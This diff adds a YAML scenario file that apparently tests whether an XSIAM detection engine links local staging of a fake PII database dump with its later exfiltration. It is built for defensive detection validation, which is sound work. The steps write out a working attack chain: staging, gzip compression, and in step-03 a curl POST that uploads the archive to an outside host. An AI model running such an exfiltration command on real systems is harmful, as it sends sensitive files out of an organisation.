@@ -1,0 +1,117 @@
+scenario_id: "SIM-DLP-004"
+name: "Cross-Channel DLP: Endpoint Local Staging to Network Exfiltration"
+version: "1.0"
+status: "active"
+plane: "DLP"
+detection_types:
+  - BIOC
+  - Correlation
+  - Analytics
+
+uc_ref: "UCS-DLP-01"
+tc_ref: "TC-DLP-02"
+tc_refs:
+  - "TC-DLP-02"
+uc_name: "Enterprise Data Loss Prevention"
+tc_name: "Demonstrate cross-channel correlation identifies coordinated data staging across endpoint and network"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1048"
+mitre_technique_name: "Exfiltration Over Alternative Protocol"
+additional_techniques:
+  - technique: "T1074.001"
+    name: "Data Staged: Local Data Staging"
+  - technique: "T1560.001"
+    name: "Archive Collected Data: Archive via Utility"
+
+threat_report: "Unit 42 - Multi-Vector Data Exfiltration & APT Operations"
+threat_report_url: "https://unit42.paloaltonetworks.com/data-exfiltration-vectors/"
+
+execution_identity:
+  default: "svc-backup"
+  options:
+    - "svc-backup"
+    - "www-data"
+    - "root"
+
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Cross-Source Correlation"
+methodology_family: "F6"
+primary_kpi: "Cross-Source Correlation Rate"
+threshold:
+  kpi: "Cross-Source Correlation Rate"
+  op: "≤"
+  value: 300
+  unit: "seconds"
+success_criteria: |
+  XSIAM correlation engine stitches the local endpoint sensitive data staging
+  event with the subsequent high-volume network exfiltration connection into a single
+  correlated DLP incident within 300 seconds.
+moat_tier: "LEAD"
+
+steps:
+  - id: "step-01"
+    name: "Harvest and stage sensitive database dump"
+    command: |
+      mkdir -p /tmp/cortex_dlp_cross
+      cat << 'EOF' > /tmp/cortex_dlp_cross/db_users_dump.sql
+      -- DUMP TABLE users
+      INSERT INTO users (id, name, email, ssn, pin_hash) VALUES (1, 'Admin User', 'admin@corp.internal', '999-11-2222', 'e80b5017098950fc58aad83c8c14978e');
+      INSERT INTO users (id, name, email, ssn, pin_hash) VALUES (2, 'Finance VP', 'cfo@corp.internal', '888-22-3333', 'c33367701511b4f6020ec61ded352059');
+      INSERT INTO users (id, name, email, ssn, pin_hash) VALUES (3, 'HR Director', 'hr@corp.internal', '777-33-4444', 'b70868f773cb290e290fdb4cc3c5095d');
+      EOF
+    identity: "svc-backup"
+    mitre_technique: "T1074.001"
+    expected_detections:
+      - plane: DLP
+        type: BIOC
+        description: "SQL database dump file containing PII created in staging directory"
+        ttp_ref: "TTP-2026-0180"
+        detection_id: "bioc-sql-dump-pii-staging"
+
+  - id: "step-02"
+    name: "Encode and compress staged data payload"
+    command: |
+      gzip -c /tmp/cortex_dlp_cross/db_users_dump.sql > /tmp/cortex_dlp_cross/staged_payload.gz
+    identity: "svc-backup"
+    mitre_technique: "T1560.001"
+    causality:
+      parent_step: "step-01"
+      pivot: "process_lineage"
+    expected_detections:
+      - plane: DLP
+        type: BIOC
+        description: "Compression of staged database dump file"
+        ttp_ref: "TTP-2026-0180"
+        detection_id: "bioc-compressed-staging-payload"
+
+  - id: "step-03"
+    name: "Exfiltrate staged payload over high-volume network stream"
+    command: |
+      curl -sk -X POST --data-binary "@/tmp/cortex_dlp_cross/staged_payload.gz" \
+        -H "Content-Type: application/octet-stream" \
+        https://httpbin.org/post || true
+    identity: "svc-backup"
+    mitre_technique: "T1048"
+    causality:
+      parent_step: "step-02"
+      pivot: "endpoint_network_stitch"
+    expected_detections:
+      - plane: DLP
+        type: Correlation
+        description: "XSIAM cross-channel correlation: Endpoint database dump staging stitched to outbound network egress"
+        ttp_ref: "TTP-2026-0180"
+        detection_id: "cr-cross-channel-dlp-stitch"
+      - plane: DLP
+        type: Analytics
+        description: "Anomalous outbound octet-stream upload by non-standard process"
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortex_dlp_cross"
+
+author: "Henry Reed"
